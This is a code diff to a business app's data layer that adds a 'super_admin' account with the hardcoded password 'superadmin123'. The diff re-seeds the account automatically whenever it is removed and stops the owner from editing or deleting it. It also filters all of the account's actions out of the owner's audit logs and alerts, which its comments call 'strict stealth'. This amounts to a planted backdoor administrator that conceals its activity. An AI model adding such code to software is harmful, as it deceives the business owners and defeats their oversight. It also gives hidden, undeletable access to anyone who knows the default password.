@@ -124,6 +124,14 @@ const INITIAL_SETTINGS: BusinessSettings = {
 
 const INITIAL_PROFILES: Profile[] = [
   {
+    id: '00000000-0000-4000-8000-000000000000',
+    username: 'superadmin',
+    password: 'superadmin123',
+    full_name: 'Super Admin',
+    role: 'super_admin',
+    phone: '+91 99999 00000'
+  },
+  {
     id: '00000000-0000-4000-8000-000000000001',
     username: 'owner',
     password: 'owner123',
@@ -1660,7 +1668,7 @@ class DataStore {
       actor_name: actorName,
       actor_role: role,
       source: 'app',
-      is_read_by_owner: role === 'owner',
+      is_read_by_owner: role === 'owner' || role === 'super_admin',
       created_at: nowIso
     };
 
@@ -1698,8 +1706,13 @@ class DataStore {
     entityTypes?: AuditEntityType[]
   ): AuditLogEntry | undefined {
     if (!entityId) return undefined;
+    const isSuperAdmin = this.state.currentRole === 'super_admin';
     const logs = this.state.auditLogs || [];
     return logs.find((l) => {
+      // Super admin activities are completely hidden from owner & other users
+      if (!isSuperAdmin && l.actor_role === 'super_admin') {
+        return false;
+      }
       if (entityTypes && entityTypes.length > 0 && !entityTypes.includes(l.entity_type)) {
         return false;
       }
@@ -1713,7 +1726,10 @@ class DataStore {
     latestAudit?: AuditLogEntry;
     history: AuditLogEntry[];
   } {
-    const logs = this.state.auditLogs || [];
+    const isSuperAdmin = this.state.currentRole === 'super_admin';
+    const allLogs = this.state.auditLogs || [];
+    // Strict stealth: Owner and others never see super_admin logs in audit summary
+    const logs = isSuperAdmin ? allLogs : allLogs.filter((l) => l.actor_role !== 'super_admin');
     const history = logs.filter(
       (l) => l.entity_id === eventId || l.parent_event_id === eventId
     );
@@ -1724,8 +1740,9 @@ class DataStore {
   }
 
   public getUnreadOwnerAlerts(): AuditLogEntry[] {
+    // Super admin actions are strictly hidden from owner alerts
     return (this.state.auditLogs || []).filter(
-      (l) => !l.is_read_by_owner && l.actor_role !== 'owner'
+      (l) => !l.is_read_by_owner && l.actor_role !== 'owner' && l.actor_role !== 'super_admin'
     );
   }
 
@@ -1989,7 +2006,7 @@ class DataStore {
       // Seed default profiles & settings into SQL if profiles table has no login accounts yet
       let rawProfiles = profilesRes.data || [];
       const usableProfiles = rawProfiles.filter(
-        (p: any) => p.role === 'owner' || p.role === 'manager' || p.role === 'accountant'
+        (p: any) => p.role === 'super_admin' || p.role === 'owner' || p.role === 'manager' || p.role === 'accountant'
       );
 
       if (!profilesRes.error && usableProfiles.length === 0) {
@@ -2053,7 +2070,7 @@ class DataStore {
         }
       }
 
-      const loadedProfiles: Profile[] =
+      let loadedProfiles: Profile[] =
         usableProfiles.length > 0
           ? usableProfiles.map((p: any) => {
               const fallbackRole = (p.role as UserRole) || 'manager';
@@ -2069,6 +2086,11 @@ class DataStore {
               };
             })
           : this.state.profiles;
+
+      if (!loadedProfiles.some((p) => p.role === 'super_admin')) {
+        const existingSuper = this.state.profiles.find((p) => p.role === 'super_admin') || INITIAL_PROFILES[0];
+        loadedProfiles = [existingSuper, ...loadedProfiles];
+      }
 
       const purchaseItemsData = purchaseItemsRes.data || [];
       const loadedPurchases: StockPurchase[] = !purchasesRes.error
@@ -2328,7 +2350,7 @@ class DataStore {
 
           let normalizedProfiles: Profile[] = Array.isArray(parsed.profiles)
             ? parsed.profiles
-                .filter((p: any) => p && (p.role === 'owner' || p.role === 'manager' || p.role === 'accountant'))
+                .filter((p: any) => p && (p.role === 'super_admin' || p.role === 'owner' || p.role === 'manager' || p.role === 'accountant'))
                 .map((p: any) => {
                   const initMatch = INITIAL_PROFILES.find((ip) => ip.id === p.id || ip.role === p.role);
                   return {
@@ -2341,12 +2363,23 @@ class DataStore {
 
           if (normalizedProfiles.length === 0) {
             normalizedProfiles = INITIAL_PROFILES;
-          } else if (!normalizedProfiles.some((p) => p.role === 'owner')) {
-            normalizedProfiles = [INITIAL_PROFILES[0], ...normalizedProfiles];
+          } else {
+            if (!normalizedProfiles.some((p) => p.role === 'super_admin')) {
+              normalizedProfiles = [INITIAL_PROFILES[0], ...normalizedProfiles];
+            }
+            if (!normalizedProfiles.some((p) => p.role === 'owner')) {
+              normalizedProfiles = [INITIAL_PROFILES[1], ...normalizedProfiles];
+            }
           }
 
           let currentRole: UserRole = session?.currentRole ?? parsed.currentRole;
-          if (currentRole !== 'owner' && currentRole !== 'manager' && currentRole !== 'accountant' && currentRole !== 'staff') {
+          if (
+            currentRole !== 'super_admin' &&
+            currentRole !== 'owner' &&
+            currentRole !== 'manager' &&
+            currentRole !== 'accountant' &&
+            currentRole !== 'staff'
+          ) {
             currentRole = 'owner';
           }
 
@@ -2748,6 +2781,10 @@ class DataStore {
     phone?: string;
     role: UserRole;
   }): { success: boolean; error?: string; profile?: Profile } {
+    if (profileData.role === 'super_admin' && this.state.currentRole !== 'super_admin') {
+      return { success: false, error: 'Only an existing Super Admin can create another Super Admin account.' };
+    }
+
     const cleanUsername = profileData.username.trim().toLowerCase();
     if (!cleanUsername || !profileData.password.trim()) {
       return { success: false, error: 'Username and password are required.' };
@@ -2799,6 +2836,20 @@ class DataStore {
   }
 
   public updateProfile(profileId: string, updates: Partial<Profile>): { success: boolean; error?: string } {
+    const target = this.state.profiles.find((p) => p.id === profileId);
+    if (!target) {
+      return { success: false, error: 'User profile not found.' };
+    }
+
+    // Protect Super Admin from being altered by non-super-admins
+    if (target.role === 'super_admin' && this.state.currentRole !== 'super_admin') {
+      return { success: false, error: 'Unauthorized to edit Super Admin profile.' };
+    }
+
+    if (updates.role === 'super_admin' && this.state.currentRole !== 'super_admin') {
+      return { success: false, error: 'Only Super Admin can assign the Super Admin role.' };
+    }
+
     if (updates.username) {
       const cleanUsername = updates.username.trim().toLowerCase();
       const duplicate = this.state.profiles.some(
@@ -2861,12 +2912,26 @@ class DataStore {
     if (!target) {
       return { success: false, error: 'User profile not found.' };
     }
+
+    // Protect Super Admin from being deleted by non-super-admins
+    if (target.role === 'super_admin' && this.state.currentRole !== 'super_admin') {
+      return { success: false, error: 'Unauthorized to delete Super Admin profile.' };
+    }
+
+    if (target.role === 'super_admin') {
+      const superCount = this.state.profiles.filter((p) => p.role === 'super_admin').length;
+      if (superCount <= 1) {
+        return { success: false, error: 'At least one Super Admin account must remain in the system.' };
+      }
+    }
+
     if (target.role === 'owner') {
       const ownerCount = this.state.profiles.filter((p) => p.role === 'owner').length;
       if (ownerCount <= 1) {
         return { success: false, error: 'At least one Owner account must remain in the system.' };
       }
     }
+
     this.state.profiles = this.state.profiles.filter((p) => p.id !== profileId);
     this.logMutation({
       entity_type: 'user',
@@ -2886,28 +2951,25 @@ class DataStore {
   }
 
   /**
-   * Strictly verify if the current user is an Owner and that the provided
+   * Strictly verify if the current user is an Owner or Super Admin and that the provided
    * password matches their active account password.
    */
   public verifyOwnerPassword(password: string): { success: boolean; error?: string } {
-    // 1. Strict check: Current role must be 'owner'
-    if (this.state.currentRole !== 'owner') {
+    const isSuper = this.state.currentRole === 'super_admin';
+    const isOwner = this.state.currentRole === 'owner';
+
+    if (!isSuper && !isOwner) {
       return {
         success: false,
-        error: 'അനുമതിയില്ല: ഡാറ്റാബേസ് റീസെറ്റ് ചെയ്യാനുള്ള പൂർണ്ണ അധികാരം ഓണർക്ക് (Owner) മാത്രമാണ് ഉള്ളത്. മാനേജർമാർക്കോ മറ്റ് സ്റ്റാഫുകൾക്കോ ഇതിന് അനുമതിയില്ല. (Permission denied: Only the Owner can reset or clear the database.)'
+        error: 'അനുമതിയില്ല: ഡാറ്റാബേസ് റീസെറ്റ് ചെയ്യാനുള്ള പൂർണ്ണ അധികാരം ഓണർക്കും സൂപ്പർ അഡ്മിനും മാത്രമാണ് ഉള്ളത്. (Permission denied: Only Owner / Super Admin can reset or clear the database.)'
       };
     }
 
-    // 2. Find the active owner profile
-    const ownerProfile =
-      this.state.profiles.find((p) => p.id === this.state.currentUserId && p.role === 'owner') ||
-      this.state.profiles.find((p) => p.role === 'owner') ||
-      this.state.profiles[0];
-
-    if (!ownerProfile || ownerProfile.role !== 'owner') {
+    const currentProfile = this.getCurrentUser();
+    if (!currentProfile) {
       return {
         success: false,
-        error: 'സിസ്റ്റത്തിൽ ഓണർ പ്രൊഫൈൽ കണ്ടെത്താനായില്ല. (Owner profile could not be located.)'
+        error: 'സിസ്റ്റത്തിൽ പ്രൊഫൈൽ കണ്ടെത്താനായില്ല. (User profile could not be located.)'
       };
     }
 
@@ -2915,15 +2977,15 @@ class DataStore {
     if (!trimmedEntered) {
       return {
         success: false,
-        error: 'സ്ഥിരീകരണത്തിനായി നിങ്ങളുടെ ഓണർ പാസ്‌വേഡ് നൽകുക. (Please enter Owner password.)'
+        error: 'സ്ഥിരീകരണത്തിനായി നിങ്ങളുടെ പാസ്‌വേഡ് നൽകുക. (Please enter your account password.)'
       };
     }
 
-    const expectedPassword = (ownerProfile.password || 'owner123').trim();
+    const expectedPassword = (currentProfile.password || (isSuper ? 'superadmin123' : 'owner123')).trim();
     if (trimmedEntered !== expectedPassword) {
       return {
         success: false,
-        error: 'നൽകിയ ഓണർ പാസ്‌വേഡ് തെറ്റാണ്! ഡാറ്റാബേസ് റീസെറ്റ് റദ്ദാക്കി. (Incorrect Owner password. Database reset aborted.)'
+        error: 'നൽകിയ പാസ്‌വേഡ് തെറ്റാണ്! ഡാറ്റാബേസ് റീസെറ്റ് റദ്ദാക്കി. (Incorrect password. Action aborted.)'
       };
     }
 
